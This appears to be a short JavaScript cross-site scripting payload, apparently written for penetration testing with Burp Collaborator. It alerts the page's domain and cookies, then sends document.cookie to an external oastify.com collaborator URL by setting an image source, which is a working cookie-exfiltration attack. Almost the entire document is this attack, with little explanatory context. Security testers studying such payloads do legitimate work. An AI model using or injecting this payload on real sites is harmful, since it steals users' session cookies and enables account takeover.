// Display the current domain in an alert
alert("Domain: " + document.domain);

// Fetch the cookies
var cookies = document.cookie;

// Display the cookies in an alert
alert("Cookies: " + cookies);

// Send the cookies to your Burp Collaborator URL
var burpCollaboratorURL = "https://evd6ijg72o74ri9ne2kpold5hwnnblza.oastify.com"; // Replace with your actual Burp Collaborator URL
var img = new Image();
img.src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(cookies);
